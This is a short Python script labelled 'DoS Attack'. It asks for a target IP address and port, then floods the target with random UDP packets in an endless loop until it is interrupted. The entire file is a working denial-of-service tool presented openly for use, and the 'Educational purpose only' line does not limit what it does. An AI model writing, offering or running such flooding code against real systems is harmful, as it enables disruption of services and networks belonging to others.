import os
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(1490)

os.system("clear")
os.system("figlet DoS Attack | lolcat")
print("""
Author   : Original by majidtdeni666, Modified by 0xZ1R0
GitHub   : https://github.com/0xZ1R0
**Educational purpose only**
""")

ip = input("IP Target (e.g., 127.0.0.1 for local): ")
port = int(input("Port (e.g., 8080): "))

print("\nSending packets. Press Ctrl+C to stop.\n")
sent = 0
try:
    while True:
        sock.sendto(bytes_to_send, (ip, port))
        sent += 1
        print(f"Sent {sent} packet(s) to {ip} through port: {port}")
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
except Exception as e:
    print(f"\nAn error occurred: {e}")
finally:
    sock.close()
